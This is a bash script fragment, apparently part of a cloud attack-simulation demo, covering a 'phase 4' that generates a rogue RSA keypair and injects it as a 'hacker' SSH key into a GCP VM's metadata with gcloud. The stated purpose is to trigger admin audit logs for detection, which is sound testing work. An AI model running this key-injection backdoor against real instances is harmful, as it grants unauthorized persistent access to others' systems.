# -----------------------------------------------------------------
# SCENARIO: SSH Persistence (Triggering Compute Admin Logs)
# -----------------------------------------------------------------
echo -e "${YELLOW}[*] PHASE 4: SSH Persistence Injection (Triggering Compute Admin Logs)...${NC}"
sleep 2

echo -e "${YELLOW}[*] Generating rogue RSA keypair...${NC}"
# Create a dummy key in the background
ssh-keygen -t rsa -b 2048 -f /tmp/rogue_key -N "" -q
ROGUE_PUB_KEY=$(cat /tmp/rogue_key.pub)

echo -e "${YELLOW}[*] Attempting to inject rogue SSH key into wiz-mongodb-vm metadata via GCP API...${NC}"
sleep 2

# This command hits the GCP Control Plane to modify the VM's metadata, leaving a massive audit trail
gcloud compute instances add-metadata wiz-mongodb-vm \
    --zone=us-central1-a \
    --metadata ssh-keys="hacker:$ROGUE_PUB_KEY" > /dev/null 2>&1

echo -e "${RED}[!] BACKDOOR INSTALLED: Rogue SSH key successfully injected into VM!${NC}"
sleep 2
echo -e "${GREEN}[+] Compute Metadata Tampering logged.${NC}"
echo ""

# Cleanup the fake key locally
rm -f /tmp/rogue_key /tmp/rogue_key.pub
